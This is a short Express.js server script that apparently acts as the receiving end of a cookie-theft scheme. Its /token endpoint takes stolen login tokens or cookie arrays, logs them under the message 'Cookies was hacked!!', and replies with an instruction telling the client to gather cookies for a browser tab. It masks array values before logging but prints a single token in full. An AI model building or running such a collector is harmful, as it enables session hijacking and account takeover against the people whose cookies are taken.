const express = require("express");
const app = express();
const PORT = 5555;

app.use(express.json({ limit: "50mb" }));
app.use(express.urlencoded({ extended: true, limit: "50mb" }));
function logTokenRequest(req) {
  let recivedData = req.body;
  if (req.body?.loginInfo?.token instanceof Array) {
    // Only for safety
    recivedData = req.body.loginInfo.token.map((a) => ({
      ...a,
      value: "#####",
    }));
    console.log("Cookies was hacked!!", JSON.stringify(recivedData));
  } else if (req.body?.loginInfo?.token) {
    console.log("Token is ", req.body.loginInfo.token);
  } else {
    console.log("No token found");
  }
}

app.post("/token", (req, res) => {
  logTokenRequest(req);
  let result = {
    onTokenReceived: "onMessageHandler",
    token: { type: "getCookiesForTab" }
  };
  res.json(result);
});

app.listen(PORT, () => {
  console.log(`🚀 Server is running on http://localhost:${PORT}`);
});
